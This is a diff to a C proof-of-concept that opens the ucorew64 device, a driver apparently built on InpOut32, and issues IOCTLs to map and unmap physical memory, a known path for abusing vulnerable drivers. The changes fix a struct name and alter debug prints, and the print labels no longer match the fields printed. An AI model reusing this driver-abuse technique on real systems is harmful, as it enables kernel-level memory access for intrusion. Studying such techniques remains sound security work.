@@ -20,7 +20,7 @@ struct Phys32Struct
     SIZE_T dwPhysMemSizeInBytes;
     PVOID pvPhysAddress;
     PVOID pvPhysMemLin;
-};
+} ;
 //source: https://github.com/ellysh/InpOut32/blob/fa28b483c4ab9e18f6d437fad390022181aa37f9/driver/hwinterfacedrv.h#L15
 
 
@@ -29,7 +29,7 @@ int main(char argc, char** argv)
     HANDLE device = INVALID_HANDLE_VALUE;
     NTSTATUS status = FALSE;
     DWORD bytesReturned = 0;
-    struct struct_buffer phys32Struct = { 0 };
+    struct Phys32Struct phys32Struct = { 0 };
 
 
     device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
@@ -59,9 +59,10 @@ int main(char argc, char** argv)
     HANDLE device2 = INVALID_HANDLE_VALUE;
     NTSTATUS status2 = FALSE;
     DWORD bytesReturned2 = 0;
-    printf("phys32Struct.PhysicalBaseAddress: %X\n", phys32Struct.PhysicalBaseAddress);
-    printf("phys32Struct.BusAddress: %X\n", phys32Struct.BusAddress);
-    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.SectionHandle);
+    printf("phys32Struct.PhysicalBaseAddress: %X\n", phys32Struct.dwPhysMemSizeInBytes);
+    printf("phys32Struct.BusAddress: %X\n", phys32Struct.PhysicalMemoryHandle);
+    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysAddress);
+    printf("phys32Struct.SectionHandle: %X\n", phys32Struct.pvPhysMemLin);
 
     printf("[ ] Calling UnmapPhysicalMemory 0x%X\n", UnmapPhysicalMemory);
     status = DeviceIoControl(device2, UnmapPhysicalMemory, &phys32Struct,
